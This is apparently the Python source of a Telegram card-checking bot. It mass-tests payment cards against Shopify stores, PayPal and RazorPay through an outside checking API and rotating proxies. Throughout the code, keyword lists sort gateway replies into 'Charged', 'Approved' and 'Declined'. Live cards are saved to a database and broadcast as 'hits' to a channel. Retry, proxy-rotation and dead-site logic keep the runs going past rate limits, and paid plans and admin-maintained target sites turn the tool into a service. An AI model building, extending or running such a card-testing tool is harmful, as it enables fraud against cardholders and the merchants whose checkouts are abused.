...
from database import (
    ...
    add_global_site, get_global_sites, get_global_sites_with_info, remove_global_site,
...
API_BASE_URL = os.getenv("API_BASE_URL", "https://autosh.up.railway.app/shopii")
...
ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}   # used for mass Shopify
...
# ====================== IMPROVED SITE DEAD DETECTION (merged from bot11) ======================
def is_site_dead(response_text):
    """
    Comprehensive dead-site detection based on bot11.py's patterns.
    Returns True if the site response indicates the site is dead.
    """
...
# ====================== SMART ROTATION ENGINE (simplified) ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
...
# ====================== COMPLETE SITE ERROR DETECTION (legacy, kept for compatibility) ======================
SITE_ERROR_KEYWORDS = [
    ...
    'no session token', 'no checkout token found', 'no checkout token',
    ...
    'checkout_not_found', 'no shipping methods available',
...
PP_RETRY_KEYWORDS = [
    ...
    'gateway timeout', 'empty reply', 'invalid json', 'could not resolve host',
    'network error', 'ssl routines', 'unreachable', 'proxy dead',
    'proxy error', 'proxy timeout', 'rate limited', 'too many requests',
    '429', 'retry after', 'temporary error', 'try again', 'please retry',
    ...
    'no route to host', 'Error Processing Card: 503', 'Service Unava',
    'DECISION_RULE_BLOCK', 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
    'policy_class', 'INVALID_PAYMENT_METHOD', 'MERCHANDISE_OUT_OF_STOCK',
    'VALIDATION_CUSTOM', 'BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH',
    'Empty submit response', 'No valid payment method found',
    'HTTP_429',
]
...
def format_pp_single_result(status, card, gateway, response, bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
...
async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    ...
    try:
        ...
        async with s.get(url) as r:
            if r.status == 429:
                return {"Response": "HTTP_429 - Too Many Requests", "Price": "-", "Gateway": "-", "Status": "RetryError", "card": card, "site": site}
            if r.status != 200:
        ...
        return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "RetryError", "card": card, "site": site}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        err = str(e)
        st2 = "RetryError" if is_card_retry_needed(err) else "SiteError"
        return {"Response": err[:100], "Price": "-", "Gateway": "Unknown", "Status": st2, "card": card, "site": site}


# ====================== IMPROVED CHECK CARD WITH RETRY (merged from bot11) ======================
async def check_card_with_retry(card, sites, user_id=None, max_retries=4, cancel_check=None, http_session=None):
    """
    Try up to max_retries random sites. If a site returns dead, skip it and try another.
    Returns (result_dict, site_index, used_site)
    """
    if not sites:
        return {"Response": "No sites available", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1, None
    ...
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1, None

        # Pick a random site that hasn't been tried
        ...
        # Use a random proxy from user's pool
        ...
        if proxy_data:
            ...
            result = await check_card_api(card, site, None, user_id, http_session=http_session)

        # If result is not dead, return it
        ...
        # Otherwise store as last dead result and continue
        last_result = result
        last_site = site

        # Short delay before next try
    ...
    if last_result:
        ...
        return {"Response": "All sites failed", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1, None
...
async def check_rz_api(card, proxy_data=None, user_id=None, http_session=None):
    ...
    try:
        ...
        async with s.get(url) as r:
            if r.status == 429:
                return {"Response": "HTTP_429 - Too Many Requests", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
            if r.status != 200:
        ...
        err = str(e)
        st = "RetryError" if is_card_retry_needed(err) else "Error"
        return {"Response": err[:100], "Price": "-", "Gateway": "RazorPay", "Status": st, "card": card}
...
async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    ...
    for attempt in range(max_retries):
        ...
        if status == "RetryError" or is_card_retry_needed(resp_text):
...
# ====================== PAYPAL API (unchanged) ======================
def build_paypal_api_url(cc, proxy_data=None):
    url = f'{PAYPAL_API_URL}?cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
...
def classify_paypal_response(response_text):
    gate = 'PayPal'
    
    if not response_text:
        return {"Response": "Empty Response", "Price": "$5.00", "Gateway": gate, "Status": "Error"}
    
    resp_lower = response_text.lower().strip()
    
    if is_pp_retry_error(response_text):
        return {"Response": response_text, "Price": "$5.00", "Gateway": gate, "Status": "RetryError"}
    
    charged_keywords = [
        'charged', 'payment successful', 'payment success', 'transaction success',
        'order paid', 'order placed', 'order confirmed', 'money received',
        'payment received', 'successful charge', 'charged successfully',
        'payment completed', 'completed', 'captured', 'authorized',
        'payment captured', 'payment authorized', 'thank you for your order',
        'order_received', 'order_placed', 'order_confirmed'
    ]
    
    approved_keywords = [
        'otp required', 'otp_required', '3d authentication', '3ds required',
        '3ds_required', 'authentication required', 'authentication_required',
        'additional authentication', 'bank authentication', 'cvc', 'ccn',
        'insufficient funds', 'insufficient_funds', 'insufficient balance',
        'please authenticate', 'verify your card', 'card verification required'
    ]
    
    declined_keywords = [
        'card declined', 'card_declined', 'generic decline', 'generic_decline',
        'do not honor', 'do_not_honor', 'stolen card', 'stolen_card',
        'lost card', 'lost_card', 'expired card', 'expired_card',
        'restricted card', 'restricted_card', 'fraudulent', 'fraud suspected',
        'fraud_suspected', 'transaction not allowed', 'transaction_not_allowed',
        'card not supported', 'card_not_supported', 'currency not supported',
        'currency_not_supported', 'duplicate transaction', 'duplicate_transaction',
        'pickup card', 'pickup_card', 'revocation of authorization',
        'revocation_of_authorization', 'no action taken', 'no_action_taken',
        'avs check failed', 'avs_check_failed', 'incorrect number',
        'incorrect_number', 'invalid number', 'invalid_number',
        'invalid card', 'invalid_card', 'payment failed', 'payment_failed',
        'failed transaction', 'transaction failed', 'declined',
        'your card was declined', 'payment error', 'bank declined',
        'cancelled', 'payment cancelled', 'cancelled transaction',
        'not permitted', 'not_permitted', 'generic error', 'generic_error',
        'decision rule block', 'decision_rule_block', 'validation custom',
        'validation_custom', 'invalid payment method', 'invalid_payment_method'
    ]
    
    for keyword in charged_keywords:
        if keyword in resp_lower:
            return {"Response": response_text, "Price": "$5.00", "Gateway": gate, "Status": "Charged"}
    
    for keyword in approved_keywords:
        if keyword in resp_lower:
            return {"Response": response_text, "Price": "$5.00", "Gateway": gate, "Status": "Approved"}
    
    for keyword in declined_keywords:
        if keyword in resp_lower:
            return {"Response": response_text, "Price": "$5.00", "Gateway": gate, "Status": "Declined"}
    
    return {"Response": response_text, "Price": "$5.00", "Gateway": gate, "Status": "Declined"}


async def check_paypal_api(card, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_paypal_api_url(card, proxy_data)
        ...
        async with s.get(url) as r:
            ...
            if r.status == 429:
                return {
                    "Response": "HTTP_429 - Too Many Requests",
                    "Price": "$5.00",
                    "Gateway": "PayPal",
                    "Status": "RetryError",
                    "card": card
            ...
            if r.status != 200:
                return {
                    "Response": f"HTTP_{r.status}: {response_text[:100]}",
                    "Price": "$5.00",
                    "Gateway": "PayPal",
                    "Status": "RetryError",
                    "card": card
            ...
            try:
                ...
                resp_msg = data.get('response', data.get('message', data.get('status', str(data))))
                if isinstance(resp_msg, dict):
                    resp_msg = str(resp_msg)
            except:
                resp_msg = response_text
            
            resp_msg = resp_msg.strip()[:250]
            
            result = classify_paypal_response(resp_msg)
            result["card"] = card
            return result
            
    except asyncio.TimeoutError:
        return {"Response": "Timeout", "Price": "$5.00", "Gateway": "PayPal", "Status": "RetryError", "card": card}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        err = str(e)
        st = "RetryError" if is_card_retry_needed(err) else "Error"
        return {"Response": err[:100], "Price": "$5.00", "Gateway": "PayPal", "Status": st, "card": card}


async def check_paypal_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    tried_proxies = set()
    last = None
    backoff = 1.0
    ...
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "$5.00", "Gateway": "PayPal", "Status": "Error", "card": card}
        ...
        if proxy_data:
            ...
            sem = await get_proxy_sem(proxy_url)
            async with sem:
                result = await check_paypal_api(card, proxy_data, user_id, http_session=http_session)
        else:
            result = await check_paypal_api(card, proxy_data, user_id, http_session=http_session)
    ...
    if last:
        last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "$5.00", "Gateway": "PayPal", "Status": "Error", "card": card}
...
{PE} <b><i>{bs('Sites')}</i></b> (<b>{bs('Admin Only')}</b>)
...
{sl}"""
        ...
        ei = [CE["bolt"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["fire"], CE["search"], CE["pin"], CE["brain"], CE["plus"], CE["cross"], CE["globe"], CE["link"], CE["shield"], CE["link"], CE["eyes"], CE["tick"], CE["trash"], CE["info"], CE["info"]] + se
...
┗ ⚡ <i>{bs('Check the code and try again')}</i>""", emoji_ids=[CE["cross"]])
    ...
    if is_paid_plan(current_plan):
        from database import _load_json_db
        db_data = _load_json_db()
...
{PE} <b>{bs('Proxies')}:</b> <code>{pc}/{bs('100')}</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["link"], CE["shield"]])
            ...
            try:
                ...
                if res['status'] == 'alive':
                    ...
                    if price_val <= max_price:
                        if await add_global_site(site, res.get('gateway', 'Unknown'), ps): 
                            added_to_db += 1
                else: 
                    dead += 1
                await update_ui()
...
async def list_sites(event):
    ...
    if not await force_join_check(event): 
        return
    sites_data = await get_global_sites_with_info()
    if not sites_data: 
        return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    
    text = f"{PE} <b>{bs('Global Sites')}</b> ({len(sites_data)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
...
async def single_cc_check(event):
    ...
    # Use global sites (admin maintained)
    sites = await get_global_sites()
    if not sites:
        return await styled_reply(event, f"{PE} <b>{bs('No sites available!')}</b> {bs('Contact admin')}", emoji_ids=[CE["warn"]])
    proxies = await get_all_user_proxies(uid)
    if not proxies and uid not in ADMIN_ID and not is_paid_plan(plan):
        # Free users may use admin proxies? But we'll just use their own or none.
        # For fallback, we could use admin proxies but we'll skip for simplicity.
        pass
    ...
    try:
        ...
        async with get_user_sem(uid, "sp"):
            ...
            result, _ = await check_card_with_retry(card, sites, uid, max_retries=4, http_session=http_session)
            bi = await bin_task
...
async def rz_single_check(event):
    ...
    proxies = await get_all_user_proxies(uid)
    if not proxies and uid not in ADMIN_ID and not is_paid_plan(plan):
        # fallback to admin proxies? skip.
        pass
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: 
...
async def pp_single_check(event):
    ...
    card = _get_card_from_event(event, rm)
    if not card: 
        return await styled_reply(event, f"{PE} <code>/pp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): 
        set_free_sp_last_use(uid)
        increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    ...
    try:
        ...
        bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
        result = await check_paypal_with_retry(card, proxies, uid, max_retries=3, http_session=http_session)
        bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'PayPal', '5.00'))
        msg, eid = format_pp_single_result(status, card, 'PayPal', result.get('Response', '')[:150], bi, elapsed)
        try: 
            await lm.delete()
        except: 
            pass
        ...
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "PayPal"))
    except Exception as e:
        try: 
            await lm.delete()
        except: 
...
# ====================== IMPROVED MASS PROCESSING FOR /msp (merged from bot11, with detailed results file) ======================
async def process_mass_shopify(event, cards, global_sites):
    """
    Mass check for Shopify using bot11.py's robust logic.
    Now collects detailed results and sends a file with all cards and responses.
    """
    uid = event.sender_id
    total = len(cards)
    checked = 0
    ...
    # Local copy of sites – dead ones will be removed on the fly
    local_sites = global_sites.copy()

    # Detailed results for file
    detailed_results = []

    # Send initial status message
    status_msg = await styled_reply(event, f"<pre>{PE} {bs('Processing')} {total} {bs('CCs')} ...</pre>", emoji_ids=[CE["chart"]])

    sem = get_user_sem(uid, "msp")
    http_session = await get_user_http_session(uid, "sp")

    # Stop flag
    if uid not in ACTIVE_MTXT_PROCESSES:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    else:
        ACTIVE_MTXT_PROCESSES[uid]["stopped"] = False
        ACTIVE_MTXT_PROCESSES[uid]["tasks"] = []

    def is_stopped():
        return ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True)

    # Helper to update status message with buttons
    async def update_status():
        if is_stopped():
            return
        buttons = [
            [pbtn(f"{bs('Charged')} ➜ {charged}", "none"), pbtn(f"{bs('Approved')} ➜ {approved}", "none")],
            [pbtn(f"{bs('Declined')} ➜ {declined}", "none"), pbtn(f"{bs('Errors')} ➜ {errors}", "none")],
            [pbtn(f"{bs('Progress')} ➜ {checked}/{total}", "none")],
            [pbtn(bs("Stop"), f"stop_mass_shopify:{uid}")]
        ]
        try:
            await styled_edit(status_msg, f"<pre>{PE} {bs('Processing')} ...</pre>", buttons=buttons, emoji_ids=[CE["star"]])
        except:
            pass
    ...
    async def worker(card):
        ...
        async with sem:
            if is_stopped():
                return
            try:
                # Use improved retry with local sites
                res, site_index, used_site = await check_card_with_retry(
                    card, local_sites, uid, max_retries=4,
                    cancel_check=is_stopped, http_session=http_session
                )
                if is_stopped():
                    return

                # If the used site is dead, remove it from local_sites (so we don't try it again)
                if used_site and is_site_dead(res.get("Response", "")):
                    if used_site in local_sites:
                ...
                detail = {
                    ...
                    "gateway": gateway,
                    "response": response,
                    "site": used_site if used_site else "N/A",
                    "price": price,
                ...
                # Determine result type and take actions
                if status == "Charged":
                    charged += 1
                    # Save to DB, send hit, pin
                    asyncio.create_task(save_card_to_db(card, "CHARGED", response, gateway, price))
                    asyncio.create_task(_send_mass_hit(card, res, "Charged", uid, status_msg, site_display))
                    await pin_charged_message(event, status_msg)  # pin status? maybe pin last charged
                elif status == "Approved":
                    approved += 1
                    asyncio.create_task(save_card_to_db(card, "APPROVED", response, gateway, price))
                    asyncio.create_task(_send_mass_hit(card, res, "Approved", uid, status_msg, site_display))
                elif status == "Error":
                    errors += 1
                else:
                    declined += 1
                ...
                log_user(uid, "MASS_ERROR", f"Card {card}: {e}", "error")
    ...
    for i in range(0, len(cards), batch_size):
        ...
        for card in batch:
            if is_stopped():
                break
            t = asyncio.create_task(worker(card))
            tasks.append(t)
        if tasks:
            # Store tasks for potential stop
            ACTIVE_MTXT_PROCESSES[uid]["tasks"].extend(tasks)
            await asyncio.gather(*tasks, return_exceptions=True)

    # Final update
    final_text = f"""✅ <b>{bs('Mass Check Complete')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
...
{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    final_buttons = [
        [pbtn(f"{bs('Charged')} ➜ {charged}", "none"), pbtn(f"{bs('Approved')} ➜ {approved}", "none")],
        [pbtn(f"{bs('Declined')} ➜ {declined}", "none"), pbtn(f"{bs('Errors')} ➜ {errors}", "none")],
        [pbtn(f"{bs('Total')} ➜ {checked}/{total}", "none")]
    ]
    try:
        await styled_edit(status_msg, final_text, buttons=final_buttons, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]])
    except:
        pass

    # Send detailed results file (same as mrz/mpp)
    await send_detailed_results_file(uid, charged, approved, declined, errors, total, detailed_results, "Shopify")
...
async def _send_mass_hit(card, res, status, uid, status_msg, site_display):
    # Send individual result message for Charged/Approved (like bot.py does)
    try:
        bin_info = await get_bin_info(card.split("|")[0])
        gw = res.get('Gateway', 'Shopify')
        resp = res.get('Response', '')[:150]
        price = res.get('Price', '-')
        msg, eid = format_simple_card_result(status, card, gw, resp, bin_info, 0.0, extra_field=("Price", price) if price != '-' else None)
        await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        # Also send channel hit
        if status == "Charged":
            try:
                ...
                username, name = f"user_{uid}", "User"
            await send_channel_hit(res, uid, username, name, "Shopify")
    except Exception as e:
        log.error(f"Failed to send hit for {card}: {e}")


# ====================== /msp (Shopify Mass) - updated with new mass process ======================
...
async def mass_check_cmd(event):
    ...
    # Check if inline text or reply to file
    ...
    if cmd_text:
        ...
        if rm.document:
            ...
            try:
                ...
                return await styled_reply(event, f"{PE} <b>{bs('Error reading file')}</b>", emoji_ids=[CE["cross"]])
        elif rm.text:
            content = rm.text
        else:
            return await styled_reply(event, f"{PE} <b>{bs('Invalid input')}</b>", emoji_ids=[CE["cross"]])
    else:
    ...
    if len(cards) > cl:
        cards = cards[:cl]
        await styled_reply(event, f"{PE} <b>{bs('Limit')}:</b> <code>{cl}</code> ({bs('first')} {len(cards)} {bs('processed')})", emoji_ids=[CE["warn"]])
    ...
    # Start mass process
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    asyncio.create_task(process_mass_shopify(event, cards, sites))


@client.on(events.CallbackQuery(pattern=rb"stop_mass_shopify:(\d+)"))
async def stop_mass_shopify_cb(event):
...
async def mpp_mass_check_cmd(event):
    ...
    if cmd_text: 
        ...
        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mpp</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards: 
        return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: 
    ...
    async def pp_check(card, http_session):
        return await check_paypal_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MPP_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    
    if from_inline:
        ACTIVE_MPP_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MPP_PROCESSES, "stop_mpp", pp_check, "PayPal", "mpp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mpp_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"mpp_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mpp_{uid}"] = {"cards": cards, "proxies": proxies, "event": event, "pref_msg": pm}


@client.on(events.CallbackQuery(pattern=rb"mpp_pref:(yes|no):(\d+)"))
async def mpp_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mpp_{uid}", None)
    if not data: 
        return await event.answer(f"{bs('Expired')}!", alert=True)
    try: 
        await data["pref_msg"].delete()
    ...
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MPP_PROCESSES, "stop_mpp", pp_check, "PayPal", "mpp"))


@client.on(events.CallbackQuery(pattern=rb"stop_mpp:(\d+)"))
async def stop_mpp_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: 
        return await event.answer(f"{bs('Not yours')}!", alert=True)
...
# ====================== GENERIC MASS PROCESSOR (for mrz/mpp, unchanged) ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    ...
    if sem_type == "mpp":
        workers = MPP_PER_USER_WORKERS
    elif sem_type == "mrz":
        workers = MRZ_PER_USER_WORKERS
    else:
    ...
    async def worker(card):
        ...
        async with user_sem:
            ...
            try:
                ...
                price = result.get("Price", "$5.00" if is_pp else "-")
                checked += 1
                lcd = card
                lrd = resp[:30]
                ...
                if status == "Error": 
                    ...
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz, is_pp))
                elif status == "Approved":
                    approved += 1
...
async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False, is_pp=False):
    ...
    try:
        ...
        gw = result.get('Gateway', 'PayPal' if is_pp else ('RazorPay' if is_rz else 'Shopify'))
        resp = result.get('Response', '')[:150]
        if is_rz:
            msg, eid = format_card_result_no_price(status, card, gw, resp, bi)
        elif is_pp:
            msg, eid = format_card_result(status, card, gw, resp, '$5.00', '-', bi, 0.0)
        else:
        ...
        try: 
            ...
            pass
        if status == "Charged":
            gate_type = "PayPal" if is_pp else ("RazorPay" if is_rz else "Shopify")
            asyncio.create_task(send_channel_hit(result, uid, username, name, gate_type))
    except: 
        pass


# ====================== test_site (for admin site checks) ======================
